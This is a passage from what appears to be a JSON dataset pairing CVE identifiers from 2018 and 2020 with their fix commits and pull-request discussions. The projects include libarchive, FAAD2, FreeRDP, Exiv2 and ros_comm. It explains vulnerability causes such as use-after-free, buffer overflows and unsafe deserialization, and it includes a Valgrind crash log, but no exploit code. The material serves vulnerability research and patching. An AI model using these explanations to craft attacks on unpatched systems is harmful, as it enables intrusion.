[XstreamEngine](https://github.com/pippo-java/pippo/blob/master/pippo-content-type-parent/pippo-xstream/src/main/java/ro/pippo/xstream/XstreamEngine.java) class (see issue #454), as well as any other Pippo class that works with Serialization / Deserialization, **should check the whitelist!**\r\n\r\nBelow are two implementations from where we can extract one or another idea (let's always keep in mind the simplicity, efficiency and code readability of Pippo!):\r\n- [BeanDeserializerFactory class in jackson-mapper-asl-1.9.9.redhat-6.jar](https://maven.repository.redhat.com/techpreview/all/org/codehaus/jackson/jackson-mapper-asl/1.9.9.redhat-6/jackson-mapper-asl-1.9.9.redhat-6-sources.jar)\r\n- [LookAheadObjectInputStream class in richfaces4/core](https://github.com/richfaces4/core/blob/master/impl/src/main/java/org/richfaces/util/LookAheadObjectInputStream.java)\r\n\r\nWhat do you guys think?\r\n I find this interesting [article](https://tersesystems.com/blog/2015/11/08/closing-the-open-door-of-java-object-serialization) that describes problem in detail. I see some improvements in code. I will add new comments in a new review. @mhagnumdw Thank you for explaining the issue better. I understand now that both #458 and #454 are related. I am now just wondering if we fixed also the XStream issue with this PR or if there is more work needed? I polished a litle bit this PR. Now, I think that we have enough flexibility.\r\nI tested  the modifications using [pippo-demo-session](https://github.com/pippo-java/pippo-demo/tree/master/pippo-demo-session) and everyting is OK.\r\n\r\nIn the end, I think that `WhitelistObjectInputStream` can be used in multiple places/modules (pippo-session, pippo-xstream, ...). It's not clear for me if the withlistClassNames must be static or no.\r\nWe can add new white class names via [whitelist-serialization](https://github.com/pippo-java/pippo/blob/master/pippo-core/src/main/resources/pippo/whitelist-serialization.txt).\r\nAlso, if it's necesary we can open (make public)\r\n- [loadWhitelist](https://github.com/pippo-java/pippo/blob/master/pippo-core/src/main/java/ro/pippo/core/util/WhitelistObjectInputStream.java#L79)\r\n- [addWhiteClassName](https://github.com/pippo-java/pippo/blob/master/pippo-core/src/main/java/ro/pippo/core/util/WhitelistObjectInputStream.java#L100) We can improve the format of `whitelist-serialization` file.\r\nFor example we can add support for a whole package with a line like (or other simple and better format):\r\n```\r\njava.lang.\r\n```\r\nThe line from above, could means add all classes from `java.lang` package. To add support for package is simple, just create a new `whitePackageNames` (similar with whiteClassNames) and in `isWhiteListed` method add somethig like (pseudocode):\r\n```java\r\nfor (String package: whitePackageNames) {\r\n    if (className.startWith(package)) { // trivial implementation\r\n       return true;\r\n    }\r\n}\r\n```\r\n\r\nIn the extreme case (last step), we can go (add support) with regex. So, the sky is the limit :smile:.\r\n\r\nIt's not very clear for me what about primitive classes, if we must add them by default in `whitelist-serialization`.",
            "pr_title_words": 2,
            "comments_words": 1033,
            "total_other_info_words": 1035
        },
        {
            "cve-id": "CVE-2018-10958",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/d01eb9905441d773c22c1b2473967e6309573252",
            "commit_msg": "Prevent SIGABRT on excessive subBox length in jp2image.cpp\n\nThis fixes CVE-2018-9145",
            "commit_msg_words": 11,
            "other_info": "Prevent SIGABRT on excessive subBox length in jp2image.cpp # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/470?src=pr&el=h1) Report\n> Merging [#470](https://codecov.io/gh/Exiv2/exiv2/pull/470?src=pr&el=desc) into [master](https://codecov.io/gh/Exiv2/exiv2/commit/11e66c6c9eceeddd2263c3591af6317cbd05c1b6?src=pr&el=desc) will **increase** coverage by `0.22%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/470/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/470?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master     #470      +/-   ##\n==========================================\n+ Coverage   62.28%   62.51%   +0.22%     \n==========================================\n  Files         150      150              \n  Lines       20548    20550       +2     \n==========================================\n+ Hits        12798    12846      +48     \n+ Misses       7750     7704      -46\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/470?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/jp2image.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/470/diff?src=pr&el=tree#diff-c3JjL2pwMmltYWdlLmNwcA==) | `41.81% <100%> (+13.87%)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/470?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/470?src=pr&el=footer). Last update [11e66c6...d01eb99](https://codecov.io/gh/Exiv2/exiv2/pull/470?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n @rcsanchez97 The url to the reproducer seems familiar to me, do you happen to know which issue tracks it? @D4N I searched the opened and closed issues, but I could not find one.  The only issues I found mentioning something similar issue #302 (which is a distinct issue that was fixed some time ago) and #303 (which is also a distinct issue and was closed as `not a bug`). @piponazo You are quite welcome.",
            "pr_title_words": 8,
            "comments_words": 192,
            "total_other_info_words": 200
        },
        {
            "cve-id": "CVE-2018-1000878",
            "commit_url": "https://github.com/libarchive/libarchive/commit/bfcfe6f04ed20db2504db8a254d1f40a1d84eb28",
            "commit_msg": "rar: file split across multi-part archives must match\n\nFuzzing uncovered some UAF and memory overrun bugs where a file in a\nsingle file archive reported that it was split across multiple\nvolumes. This was caused by ppmd7 operations calling\nrar_br_fillup. This would invoke rar_read_ahead, which would in some\nsituations invoke archive_read_format_rar_read_header.  That would\ncheck the new file name against the old file name, and if they didn't\nmatch up it would free the ppmd7 buffer and allocate a new\none. However, because the ppmd7 decoder wasn't actually done with the\nbuffer, it would continue to used the freed buffer. Both reads and\nwrites to the freed region can be observed.\n\nThis is quite tricky to solve: once the buffer has been freed it is\ntoo late, as the ppmd7 decoder functions almost universally assume\nsuccess - there's no way for ppmd_read to signal error, nor are there\ngood ways for functions like Range_Normalise to propagate them. So we\ncan't detect after the fact that we're in an invalid state - e.g. by\nchecking rar->cursor, we have to prevent ourselves from ever ending up\nthere. So, when we are in the dangerous part or rar_read_ahead that\nassumes a valid split, we set a flag force read_header to either go\ndown the path for split files or bail. This means that the ppmd7\ndecoder keeps a valid buffer and just runs out of data.\n\nFound with a combination of AFL, afl-rb and qsym.",
            "commit_msg_words": 241,
            "other_info": "Fix various crash, memory corruption and infinite loop conditions There are some test cases at https://bugs.launchpad.net/ubuntu/+source/libarchive/+bug/1794909\r\n\r\n I have requested CVEs for these issues through the Distributed Weakness Filing project. In case someone else is looking for the CVEs, it looks like the assignments are :\r\n- CVE-2018-1000877 for https://github.com/libarchive/libarchive/commit/021efa522ad729ff0f5806c4ce53e4a6cc1daa31\r\n- CVE-2018-1000878 for https://github.com/libarchive/libarchive/commit/bfcfe6f04ed20db2504db8a254d1f40a1d84eb28\r\n- CVE-2018-1000879 for https://github.com/libarchive/libarchive/commit/15bf44fd2c1ad0e3fd87048b3fcc90c4dcff1175\r\n- CVE-2018-1000880 for https://github.com/libarchive/libarchive/commit/9c84b7426660c09c18cc349f6d70b5f8168b5680",
            "pr_title_words": 9,
            "comments_words": 52,
            "total_other_info_words": 61
        },
        {
            "cve-id": "CVE-2018-25033",
            "commit_url": "https://github.com/admesh/admesh/commit/e84d8353f1347e1f26f0a95770d92ba14e6ede38",
            "commit_msg": "Fix heap buffer overflow in stl_update_connects_remove_1\n\n\r\n- Add argument value check to the stl_update_connects_remove_1\r\n- Add neighbor value check in stl_remove_degenerate\r\n\r\nFixes https://github.com/admesh/admesh/issues/28\r\nMerges https://github.com/admesh/admesh/pull/55",
            "commit_msg_words": 25,
            "other_info": "Fixed heap buffer overflow in stl_update_connects_remove_1 Thanks for fixing this!\r\n\r\nDo you have a POC (proof-of-concept exploit) that demonstrates it? I intend to request a CVE to track this security issue and fix it in some older Linux distributions like Debian Stretch, Buster etc.\r\n\r\nThanks! You are welcome!\r\n\r\nI do not have any exploit, but a file attached in the issue #28 triggers invalid writes in Valgrind which corresponds to the ASan log in the issue. \r\n\r\nHere is the output of Valgrind ran on an unpatched binary:\r\n```\r\n==52468== Invalid read of size 4\r\n==52468==    at 0x485B858: stl_update_connects_remove_1 (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B5EE: stl_remove_degenerate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B242: stl_remove_unconnected_facets (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x4865093: stl_repair (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B691: main (admesh.c:383)\r\n==52468==  Address 0x4b9b9c0 is 16 bytes before a block of size 192 alloc'd\r\n==52468==    at 0x4848A23: calloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)\r\n==52468==    by 0x486101F: stl_allocate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x48608FD: stl_open (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B150: main (admesh.c:330)\r\n==52468== \r\n==52468== Invalid read of size 4\r\n==52468==    at 0x485B877: stl_update_connects_remove_1 (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B5EE: stl_remove_degenerate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B242: stl_remove_unconnected_facets (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x4865093: stl_repair (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B691: main (admesh.c:383)\r\n==52468==  Address 0x4b9b9c4 is 12 bytes before a block of size 192 alloc'd\r\n==52468==    at 0x4848A23: calloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)\r\n==52468==    by 0x486101F: stl_allocate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x48608FD: stl_open (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B150: main (admesh.c:330)\r\n==52468== \r\n==52468== Invalid read of size 4\r\n==52468==    at 0x485B89A: stl_update_connects_remove_1 (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B5EE: stl_remove_degenerate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B242: stl_remove_unconnected_facets (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x4865093: stl_repair (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B691: main (admesh.c:383)\r\n==52468==  Address 0x4b9b9c8 is 8 bytes before a block of size 192 alloc'd\r\n==52468==    at 0x4848A23: calloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)\r\n==52468==    by 0x486101F: stl_allocate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x48608FD: stl_open (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B150: main (admesh.c:330)\r\n==52468== \r\n==52468== Invalid read of size 4\r\n==52468==    at 0x485B858: stl_update_connects_remove_1 (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B605: stl_remove_degenerate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B242: stl_remove_unconnected_facets (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x4865093: stl_repair (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B691: main (admesh.c:383)\r\n==52468==  Address 0x4b9b9c0 is 16 bytes before a block of size 192 alloc'd\r\n==52468==    at 0x4848A23: calloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)\r\n==52468==    by 0x486101F: stl_allocate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x48608FD: stl_open (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B150: main (admesh.c:330)\r\n==52468== \r\n==52468== Invalid read of size 4\r\n==52468==    at 0x485B877: stl_update_connects_remove_1 (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B605: stl_remove_degenerate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B242: stl_remove_unconnected_facets (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x4865093: stl_repair (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B691: main (admesh.c:383)\r\n==52468==  Address 0x4b9b9c4 is 12 bytes before a block of size 192 alloc'd\r\n==52468==    at 0x4848A23: calloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)\r\n==52468==    by 0x486101F: stl_allocate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x48608FD: stl_open (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B150: main (admesh.c:330)\r\n==52468== \r\n==52468== Invalid read of size 4\r\n==52468==    at 0x485B89A: stl_update_connects_remove_1 (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B605: stl_remove_degenerate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x485B242: stl_remove_unconnected_facets (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x4865093: stl_repair (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B691: main (admesh.c:383)\r\n==52468==  Address 0x4b9b9c8 is 8 bytes before a block of size 192 alloc'd\r\n==52468==    at 0x4848A23: calloc (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)\r\n==52468==    by 0x486101F: stl_allocate (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x48608FD: stl_open (in /home/golas/Repos/admesh/build/libadmesh.so.1.0.0)\r\n==52468==    by 0x10B150: main (admesh.c:330)\r\n==52468== \r\n``` @gladk If you want to request a CVE and you know how to do it, please do. I can however live without it.",
            "pr_title_words": 6,
            "comments_words": 538,
            "total_other_info_words": 544
        },
        {
            "cve-id": "CVE-2018-14046",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/81b6d36c90ed36a1c878171f0794f632f2ee5a78",
            "commit_msg": "[webp] Enforce minimum read size in decodeChunks\n\nThe size parameter is only checked for upper bounds, but not for lower.\nIf it is too small, then created dataBuf will be too small and overflow in one\nof the subsequent memcpy() calls.\n\nThis fixes #378 / CVE-2018-14046",
            "commit_msg_words": 46,
            "other_info": "Fix for #378",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2018-20362",
            "commit_url": "https://github.com/knik0/faad2/commit/466b01d504d7e45f1e9169ac90b3e34ab94aed14",
            "commit_msg": "syntax.c: check for syntax element inconsistencies\n\nImplicit channel mapping reconfiguration is explicitely forbidden by\nISO/IEC 13818-7:2006 (8.5.3.3). Decoders should be able to detect such\nfiles and reject them. FAAD2 does not perform any kind of checks\nregarding this.\n\nThis leads to security vulnerabilities when processing crafted AAC\nfiles performing such reconfigurations.\n\nAdd checks to decode_sce_lfe and decode_cpe to make sure such\ninconsistencies are detected as early as possible.\n\nThese checks first read hDecoder->frame: if this is not the first\nframe then we make sure that the syntax element at the same position\nin the previous frame also had element_id id_syn_ele. If not, return\n21 as this is a fatal file structure issue.\n\nThis patch addresses CVE-2018-20362 (fixes #26) and possibly other\nrelated issues.",
            "commit_msg_words": 123,
            "other_info": "CVE-2018-20194 / CVE-2018-20362 fixes This patch should fix #27 and #23 as well (same underlying issue everywhere). Thank you very much for the patch and sorry for the stupid question, but I may be he last remaining person with commit rights to this repository and my knowledge of the innards of the code is quite limited. So, is it really impossible in the AAC format that two consecutive frames have different types? Hi @fabiangreffrath, sorry for the late answer.\r\n\r\nI am not an AAC expert. I did not find any kind of official AAC file format specification which could precisely answer this question.\r\n\r\nMy guess is: it is not forbidden to define an AAC file containing frames of different formats. AFAIK, frames are independent units of data.\r\n\r\nWhether defining AAC files with frames of different formats makes sense or not is another question. Whether FAAD2 should support this is yet another question.\r\n\r\nFor the moment it is obvious that FAAD2 does not support it, because buffers are shared between frames. FAAD2 crashes if a complex frame requiring more buffers follows a simple frame. Supporting it would probably require more changes than what this patch suggests.\r\n\r\nIf my analysis is right, I suggest to officially declare this unsupported, make sure FAAD2 exits cleanly in these cases, and add this to the todo/roadmap. This is a refactoring, it should be done properly with tests, etc. not a security patch.\r\n\r\nbut then again, my knowledge of AAC is limited, and poorly documented. I have found [a copy](http://read.pudn.com/downloads69/ebook/247256/247256/13818-7_2006.pdf) of the ISO/IEC 13818-7:2006 spec. This should answer our questions.\r\n\r\nThere are three ways of specifying channel mapping: in the adts header, using PCE elements, or implicitly (8.5.3.3).\r\n\r\nIn the implicit case: _\"the  resulting configuration may not change within the bitstream without sending a program_config_element(), i.e. an implicit reconfiguration is not allowed\"_\r\n\r\nSo it looks like this patch goes the right way.\r\n\r\nI don't know whether FAAD2 handles reconfiguration via PCE elements properly. I have pushed another patch addressing CVE-2018-20194. I am quite confident in this patch, please tell me if the explanations I provided are clear enough to you.\r\n\r\nI have also updated the commit message of CVE-2018-20362 to use more precise terms and provide explanations based on the specification. @hlef May this patch from VLC be related? Just guessing from the patch description. \r\n\r\nhttps://github.com/videolan/vlc/blob/master/contrib/src/faad2/faad2-fix-cpe-reconstruction.patch > @hlef May this patch from VLC be related? Just guessing from the patch description.\r\n> \r\n> https://github.com/videolan/vlc/blob/master/contrib/src/faad2/faad2-fix-cpe-reconstruction.patch\r\n\r\nYes it is.\r\n\r\nWhat this patch does is one of the first things I tried when investigating this issue (see #26).\r\n\r\nAs far as I remember, this was not sufficient to prevent FAAD2 from crashing with the reproducer.\r\n\r\nFrom my point of view:\r\n* this situation (implicit reconfiguration) is not legal according to the specification (*as far as I understand the spec*, I am not an AAC expert)\r\n* if we don't exit at this point, FAAD2 will thus continue processing inconsistent data\r\n* this *might* trigger a variety of issues at other places in the source code\r\n* the result is likely to be garbage anyways\r\n\r\nGiven my limited knowledge of the codebase and of the AAC standard, the safest option seemed to abort at this point. This patch might work, or it might just as well replace one issue with another. So, your current stance is to better not apply that patch? > So, your current stance is to better not apply that patch?\r\n\r\nApplying both the VLC patch and my patch is probably a good idea.\r\n\r\nI'm skeptical about applying the VLC patch only, because I don't think we should continue to process the input at this point (unless my interpretation of the spec is wrong and this is a valid situtation). Since your patch is already applied for quite some time, I'll add the VLC one asap. If I got you right, it won't hurt. \r\n\r\nThanks for your input!  I consider applying this patch as well, we already have it in the Debian package:\r\n\r\nhttps://github.com/videolan/vlc/blob/master/contrib/src/faad2/faad2-fix-overflows.patch @hlef Apparently, this commit breaks decoding for many files that should be valid otherwise e.g. https://github.com/mixxxdj/mixxx/pull/2738.\r\n\r\nIIRC, the issue arises if the number of channels in a frame is more than the number of channels for which memory is allocated. However, there may be valid uses cases out there in the wild, e.g. when parametric stereo is involved or something like this, IDK.\r\n\r\nHowever, couldn't we probably make these checks less strict if we replace the `!=` condition with a `<` (or `>`?) check so that it's okay to have, say, only one channel in the frame altough memory is allocated for two? This error seems to affect files both encoded with iTunes or files purchased from the store.\r\n\r\nWe need to skip some frames manually (consisting of 6 bytes each as I noticed) after this error occurs and then everything works fine. I have no idea what these frame contain as they are too short for ADTS frames:\r\nhttps://github.com/mixxxdj/mixxx/pull/2850\r\n\r\nWe receives these ~~frames~~blocks from libmp4v2 / MP4ReadSample and forward them into the decoder. The problem with the commit seems to be related to checking that `hDecoder->frame` is non-zero. While the logic detailed in the commit messages is true for the faad2 frontend, it is not necessarily true for other users of the library (for instance mixxx) that use `NeAACDecPostSeekReset`. This is why the issue was not reproducible with the faad2 frontend.\r\n\r\nWhen mixxx opens an audio file, it seeks to the first frame, which they call frame 1. While frame numbering starts from 1 for mp4, I'm not sure if this is true for faad2, so this may be incorrect API usage by mixxx. But, in any case, this should be fixed in faad2 because it should presumably be valid to call `NeAACDecPostSeekReset` with a non-zero frame number before decoding any frames.\r\n\r\nAfter `NeAACDecPostSeekReset` is called with a non-zero frame number, this updates `hDecoder->frame` but the `element_id` array is still invalid (e.g. zero initialized). Then the code in this patch will cause any future decodings to fail until `hDecoder->frame` is zero.\r\n\r\nMy suggestion for fixing this is to stop overloading the use of `hDecoder->frame`. Maybe initialize `element_id` to an invalid ID (e.g. 255) when you open the decoder, and modify this check to:\r\n```\r\nif (hDecoder->element_id[hDecoder->fr_ch_ele] != INVALID_ELEMENT_ID && hDecoder->element_id[hDecoder->fr_ch_ele] != id_syn_ele) {\r\n``` Impressive! Could you possibly prepare a PR for this if you see it fit? Thank you!  Using a 0-based index doesn't work either. The decoding errors at the start are are fixed but then I get mismatches between the *seek-and-decode* vs. *continuous-decoding* results. And the number of MP4 sample frames has to be decreased by 1, otherwise seeking to and decoding the last addressable frame fails. We have tests for all those edge cases.\r\n\r\nI am not able exclude errors in our index calculation, though. I don't think this is about switching to a 0-based index, but about initializing the `element_id` field with a known-invalid value. Could you please check if https://github.com/knik0/faad2/pull/64/files fixes the issues you found with mixxx and faad2 for all the edge cases?",
            "pr_title_words": 4,
            "comments_words": 1174,
            "total_other_info_words": 1178
        },
        {
            "cve-id": "CVE-2018-14345",
            "commit_url": "https://github.com/sddm/sddm/commit/147cec383892d143b5e02daa70f1e7def50f5d98",
            "commit_msg": "Fix authentication when reusing an existing session\n\n- Check the success value before unlocking the session\n- Don't attempt to use the nonexistant \"sddm-check\" PAM service",
            "commit_msg_words": 26,
            "other_info": "Fix authentication when reusing an existing session",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2018-9862",
            "commit_url": "https://github.com/hyperhq/hyperstart/commit/ad6e43325da7d5f8048f23451bef26fdf4c0f93d",
            "commit_msg": "Security: fix a issue (similar to  runc CVE-2016-3697)\n\nSigned-off-by: y00316549 <yangshukui@huawei.com>",
            "commit_msg_words": 11,
            "other_info": "Security: fix a issue (similar to  runc CVE-2016-3697) Can one of the admins verify this patch? LGTM\r\ncc @laijs  Hello, Thanks for the fixing.\r\n\r\nCould you fix hyper_getpwnam() hyper_getgrnam() instead?\r\n(change it to: if the id is numeric, don't compare the name)\r\n\r\nOther info is needed from /etc/passwd even the id is numeric. I have improved it. thank you. I don't think there are any differents in the new code. How do you test it?",
            "pr_title_words": 8,
            "comments_words": 67,
            "total_other_info_words": 75
        },
        {
            "cve-id": "CVE-2018-8789",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/2ee663f39dc8dac3d9988e847db19b2d7e3ac8c6",
            "commit_msg": "Fixed CVE-2018-8789\n\nThanks to Eyal Itkin from Check Point Software Technologies.",
            "commit_msg_words": 11,
            "other_info": "Cve fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/3393/",
            "pr_title_words": 2,
            "comments_words": 14,
            "total_other_info_words": 16
        }
    ],
    "2020": [
        {
            "cve-id": "CVE-2020-35963",
            "commit_url": "https://github.com/fluent/fluent-bit/commit/cadff53c093210404aed01c4cf586adb8caa07af",
            "commit_msg": "gzip: fix compression size calculation (oss-fuzz 27261)\n\nSigned-off-by: davkor <david@adalogics.com>",
            "commit_msg_words": 10,
            "other_info": "Bug fixes thanks!",
            "pr_title_words": 2,
            "comments_words": 1,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2020-36321",
            "commit_url": "https://github.com/vaadin/flow/commit/e0dcaf86b63dbcab3adbbe107d1c49d490ead8eb",
            "commit_msg": "Update the path pattern to block slash-dot-dot either",
            "commit_msg_words": 8,
            "other_info": "fix: check if Url path is encoded twice in Dev Mode Please add a reference to the ticket in the commit message: I can't see which ticket the PR fixes. SonarQube analysis reported 3 issues\n* ![MAJOR][MAJOR] 3 major\n\nWatch the comments in this conversation to review them.\n\n#### 2 extra issues\n\nNote: The following issues were found on lines that were not modified in the pull request. Because these issues can't be reported as line comments, they are summarized here:\n\n1. ![MAJOR][MAJOR] [DevModeHandler.java#L533](https://github.com/vaadin/flow/blob/11b6e6fca7cec706cb6f33e648b8d9c89670baef/flow-server/src/main/java/com/vaadin/flow/server/DevModeHandler.java#L533): Remove this unused private \"checkPort\" method. [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3AUnusedPrivateMethod)\n1. ![MAJOR][MAJOR] [DevModeHandlerTest.java#L541](https://github.com/vaadin/flow/blob/11b6e6fca7cec706cb6f33e648b8d9c89670baef/flow-server/src/test/java/com/vaadin/flow/server/DevModeHandlerTest.java#L541): Remove this use of \"Thread.sleep()\". [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3AS2925)\n\n[MAJOR]: https://sonarsource.github.io/sonar-github/severity-major.png 'Severity: MAJOR'",
            "pr_title_words": 11,
            "comments_words": 93,
            "total_other_info_words": 104
        },
        {
            "cve-id": "CVE-2020-11098",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/c0fd449ec0870b050d350d6d844b1ea6dad4bc7d",
            "commit_msg": "Fixed Out-of-bound read in glyph_cache_put\n\nCVE-2020-11098 thanks to @antonio-morales for finding this.",
            "commit_msg_words": 12,
            "other_info": "Fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5060/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5061/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5062/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5063/\n @akallabeth re \"Do not enable glyph-cache (default)\" from GHSA, does this mean that glyph-cache is disabled or enabled by default? Just want to clarify that thanks. @tcullum-rh as glyph cache is nowadays kind of useless anyway it is disabled (and has been for a long time) due to drawing issues.",
            "pr_title_words": 1,
            "comments_words": 106,
            "total_other_info_words": 107
        },
        {
            "cve-id": "CVE-2020-13396",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/48361c411e50826cb602c7aab773a8a20e1da6bc",
            "commit_msg": "Fixed GHSL-2020-100: oob read in ntlm_read_ChallengeMessage\n\n* Added length checks for data read from stream\n* Unified function resource cleanup\n\n(cherry picked from commit 8357dedbbf7213b7d0d18f1026145b9a5b92235a)",
            "commit_msg_words": 25,
            "other_info": "Stable backport cve \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4974/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4976/",
            "pr_title_words": 3,
            "comments_words": 28,
            "total_other_info_words": 31
        },
        {
            "cve-id": "CVE-2020-16587",
            "commit_url": "https://github.com/AcademySoftwareFoundation/openexr/commit/8b5370c688a7362673c3a5256d93695617a4cd9a",
            "commit_msg": "Fix #491, issue with part number range check reconstructing chunk offset table\n\nThe chunk offset was incorrectly testing for a part number that was the\nsame size (i.e. an invalid index)\n\nSigned-off-by: Kimball Thurston <kdt3rd@gmail.com>",
            "commit_msg_words": 35,
            "other_info": "Fix #491, issue with part number range check reconstructing chunk off\u2026",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2020-16124",
            "commit_url": "https://github.com/ros/ros_comm/commit/3dd308911d7294bc6cff12f626b8467fe1555423",
            "commit_msg": "Trap for overly large input to XmlRPCPP which could cause problems with int <-> size_t conversions.\n\n - In XmlRpcClient, XmlRpcServerConnection and XmlRpcSocket, recognize when incoming or outgoing data is too large, generate an error and discard the data when practical.\n - Use the safe strtol() rather than atoi() to decode an incoming content-length header, and generate an error if the length is invalid or too large.\n - In XmlRpcUtil, prevent attempts to parse overly large XML input.\n - Add tests where they can reasonably be inserted into existing test routines.\n\nAlthough this fix could be cleaner the update is written to make the update ABI compatible.\n\nThis fix addresses CVE-2020-16124 / Integer overflow in ros_comm.\n\nSigned-off-by: Sid Faber <sid.faber@canonical.com>",
            "commit_msg_words": 119,
            "other_info": "Trap for overly large input to XmlRPCPP > Atm CI is failing for two tests though.\r\n\r\n@dirk-thomas, thanks for the review. The overrun tests I added are causing memory allocation failures--they work on my local machine but I assume the CI tests don't expect to be handling 2Gb input values. Any suggestions on how best to handle, is it advisable to remove the overrun tests? > Any suggestions on how best to handle, is it advisable to remove the overrun tests?\r\n\r\nCan the code be written in a way that it fails gracefully if that much memory isn't available? Maybe marking the test as skipped. Debian Buster only has Googletest 1.8.1 which doesn't have `GTEST_SKIP`.\r\n\r\nThe `readResponse_oversize` test still fails in CI. I removed GTEST_SKIP, printed an error message but otherwise let the test succeed. Also I removed one test that was causing problems. The test_client routines for readResponse still run when objects are finalized; since the test object could be in an unpredictable state I couldn't find a good way to ignore the results. > I removed GTEST_SKIP, printed an error message but otherwise let the test succeed.\r\n\r\nThat sounds like a good fall backback behavior. Can you make this conditional based on if `GTEST_SKIP` is available? If it is use it to give better feedback, otherwise fall back to the error message / succeed. @dirk-thomas, I added the conditional statement in one of the tests but had to rip another one out--the Ubuntu tests started running long and got killed causing the whole module to fail. I think this is as good as I can get it unless you have any ideas on how to safely & consistently write tests for huge 